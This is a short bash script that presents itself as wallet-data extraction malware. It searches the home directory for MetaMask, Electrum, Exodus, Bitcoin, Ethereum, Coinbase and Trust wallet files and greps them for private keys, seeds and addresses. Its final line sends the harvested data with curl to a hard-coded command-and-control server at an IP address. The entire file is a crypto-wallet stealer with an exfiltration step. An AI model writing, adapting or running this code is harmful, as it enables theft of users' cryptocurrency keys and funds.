#!/bin/bash

# Function to extract wallet data
extract_wallet() {
    local file=$1
    local pattern=$2
    if [ -f "$file" ]; then
        grep -A 10 "$pattern" "$file"
    fi
}

# Scan for and extract private keys from common crypto wallets
wallet_files=(
    "$HOME/.config/MetaMask/wallets"
    "$HOME/.electrum/wallets"
    "$HOME/.exodus/wallets"
    "$HOME/.bitcoin/wallet.dat"
    "$HOME/.ethereum/keystore/*"
    "$HOME/.config/coinbase/wallets"
    "$HOME/.config/trust/wallets"
)

for file in "${wallet_files[@]}"; do
    if [ -f "$file" ] || [ -d "$file" ]; then
        echo "Scanning $file..."
        if [ -d "$file" ]; then
            for wallet in "$file"/*; do
                if [ -f "$wallet" ]; then
                    extract_wallet "$wallet" "private_key" || extract_wallet "$wallet" "address" || extract_wallet "$wallet" "seed"
                fi
            done
        else
            extract_wallet "$file" "private_key" || extract_wallet "$file" "address" || extract_wallet "$file" "seed"
        fi
    fi
done

# Send the extracted data to the C&C server
DATA=$(cat <<EOF
$(extract_wallet "$HOME/.config/MetaMask/wallets" "private_key")
$(extract_wallet "$HOME/.electrum/wallets/default_wallet" "seed") #Working 100% on default_wallet
$(extract_wallet "$HOME/.exodus/wallets" "private_key")
$(extract_wallet "$HOME/.bitcoin/wallet.dat" "private_key")
$(extract_wallet "$HOME/.ethereum/keystore/*" "private_key")
$(extract_wallet "$HOME/.config/coinbase/wallets" "private_key")
$(extract_wallet "$HOME/.config/trust/wallets" "private_key")
EOF
)

curl -d "data=$DATA" http://10.72.123.123:5000/receive
